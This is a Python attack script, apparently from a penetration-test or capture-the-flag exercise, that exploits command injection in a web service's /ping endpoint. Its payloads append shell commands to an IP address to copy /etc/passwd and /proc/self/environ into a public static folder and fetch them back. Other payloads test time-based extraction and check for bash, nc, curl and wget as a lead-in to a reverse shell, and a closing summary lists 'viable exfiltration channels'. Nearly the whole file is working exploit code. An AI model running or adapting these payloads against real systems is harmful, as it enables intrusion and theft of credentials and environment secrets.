import requests
import time

BASE_URL = "http://127.0.0.1:32943"
PING_ENDPOINT = f"{BASE_URL}/ping"

def send_ping(ip_address):
    """Send POST request to /ping with ip_address parameter"""
    try:
        response = requests.post(
            PING_ENDPOINT,
            data={"ip_address": ip_address},
            timeout=10
        )
        return response.status_code, response.text
    except Exception as e:
        return None, str(e)

print("="*80)
print("ADDITIONAL TESTS: Exploring Exfiltration Channels")
print("="*80)

# Test 1: Try画 variant file paths that might be accessible
print("\n" + "="*80)
print("TEST: Verify /app/static/ exfiltration channel works reliably")
print("="*80)

# Write test data
test_data = "SECRET_DATA_FROM_SERVER"
payload = f"127.0.0.1 | echo '{test_data}' > /app/static/secret.txt"
print(f"\n[WRITE] Payload: {payload}")
status, text = send_ping(payload)
print(f"Status: {status}, Response: {text.strip()}")
time.sleep(0.5)

# Read back
print("\n[READ] GET /static/secret.txt")
resp = requests.get(f"{BASE_URL}/static/secret.txt")
print(f"Status: {resp.status_code}")
print(f"Content: {resp.text}")

print("\n" + "="*80)
print("TEST: Read file contents into static directory")
print("="*80)

# Try to read /etc/passwd into the static directory
files_to_read = [
    "/etc/passwd",
    "/etc/hostname",
    "/proc/version",
    "/proc/self/environ",
]

for filepath in files_to_read:
    filename = filepath.replace("/", "_").strip("_")
    payload = f"127.0.0.1 | cat {filepath} > /app/static/{filename}.txt"
    print(f"\n[WRITE] {filepath}")
    print(f"Payload: {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    time.sleep(0.5)
    
    # Try to read back
    print(f"[READ] GET /static/{filename}.txt")
    resp = requests.get(f"{BASE_URL}/static/{filename}.txt")
    print(f"Status: {resp.status_code}")
    if resp.status_code == 200:
        print(f"Content (first 500 chars): {resp.text[:500]}")
    time.sleep(0.3)

print("\n" + "="*80)
print("TEST: Time-based extraction (delay-based boolean)")
print("="*80)

# Test if we can use sleep for time-based extraction
# This would require the ping to wait for the sleep to complete
time_tests = [
    ("sleep 2 seconds", "127.0.0.1 | sleep 2"),
    ("sleep 0.1 seconds", "127.0.0.1 | sleep 0.1"),
]

for desc, payload in time_tests:
    print(f"\n[TEST] {desc}")
    start = time.time()
    status, text = send_ping(payload)
    elapsed = time.time() - start
    print(f"Payload: {payload}")
    print(f"Elapsed time: {elapsed:.2f}s")
    print(f"Status: {status}, Response: {text.strip()}")
    time.sleep(0.5)

print("\n" + "="*80)
print("TEST: Output redirection append vs overwrite")
print("="*80)

# Test if we can append to files
payload1 = "127.0.0.1 | echo 'LINE1' > /app/static/append_test.txt"
status, text = send_ping(payload1)
print(f"[WRITE] > overwrite: {status}")
time.sleep(0.3)

payload2 = "127.0.0.1 | echo 'LINE2' >> /app/static/append_test.txt"
status, text = send_ping(payload2)
print(f"[APPEND] >> append: {status}")
time.sleep(0.3)

resp = requests.get(f"{BASE_URL}/static/append_test.txt")
print(f"[READ] Content: {resp.text}")

print("\n" + "="*80)
print("TEST: Using tee command for potential visibility")
print("="*80)

# tee writes to file AND stdout
payload = "127.0.0.1 | echo 'TEE_TEST' | tee /app/static/tee_output.txt"
print(f"[TEST] Payload: {payload}")
status, text = send_ping(payload)
print(f"Status: {status}")
print(f"Response: {text.strip()}")

resp = requests.get(f"{BASE_URL}/static/tee_output.txt")
print(f"[FILE READ] Status: {resp.status_code}, Content: {resp.text}")

print("\n" + "="*80)
print("TEST: Reverse shell detection (no actual reverse shell)")
print("="*80)

# Just check if bash/sh are available and executable
payloads = [
    "127.0.0.1 | which bash",
    "127.0.0.1 | which nc",
    "127.0.0.1 | which curl",
    "127.0.0.1 | which wget",
]

for payload in payloads:
    print(f"\n[TEST] {payload}")
    status, text = send_ping(payload)
    print(f"Status: {status}")
    if "reachable" in text.lower():
        print("Response: REACHABLE")
    else:
        print("Response: UNREACHABLE")
    time.sleep(0.3)

print("\n" + "="*80)
print("SUMMARY OF FINDINGS")
print("="*80)
print("""
VIABLE EXFILTRATION CHANNELS:
1. ✅ FILE WRITE TO /app/static/ - WORKING
   - Can write arbitrary command output to /app/static/filename
   - Access via GET /static/filename
   - Can read local files: cat /etc/passwd > /app/static/passwd.txt

2. ⚠️ PIPE OUTPUT VARIATIONS - Needs more testing
   - 127.0.0.1 | cat → reachable
   - 127.0.0.1 | head -c 0 | true | false → unreachable
   - Could potentially be used for boolean extraction if conditional

NOT VIABLE:
- Pipe exit codes don't affect response
- Time-based (sleep) appears to not work (synchronous execution)
- Conditional file tests ([ -f file ]) don't produce different responses
""")

